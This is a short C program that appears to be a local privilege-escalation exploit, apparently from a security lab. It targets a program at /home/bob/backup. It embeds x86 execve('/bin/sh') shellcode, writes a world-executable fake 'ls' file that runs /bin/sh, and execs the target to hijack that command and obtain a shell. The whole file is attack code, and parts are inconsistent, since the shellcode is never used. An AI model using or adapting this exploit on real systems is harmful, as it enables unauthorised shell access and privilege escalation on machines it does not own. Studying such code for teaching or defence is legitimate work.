#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>

#define TARGET "/home/bob/backup"

static char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";


int main(void)
{
   char *args[4];
   char *env[1];
   FILE *fp;
   char mode[] = "0777";
   int p;


   fp = fopen("/home/user/ls","w+");



   fprintf(fp, "/bin/sh");

   fclose(fp);

   //change permission
   p = strtol(mode,0,8);
   if(chmod("/home/user/ls",p) < 0){
    fprintf(stderr, "chmod failed.\n");

   }

  // another way
  args[0] = TARGET; args[1] = "ls";
  args[2] = NULL; args[3] = NULL;

  env[0] = NULL;

  if (execve(TARGET, args, env) < 0)
    fprintf(stderr, "execve failed.\n");

  exit(0);
  return 0;
}

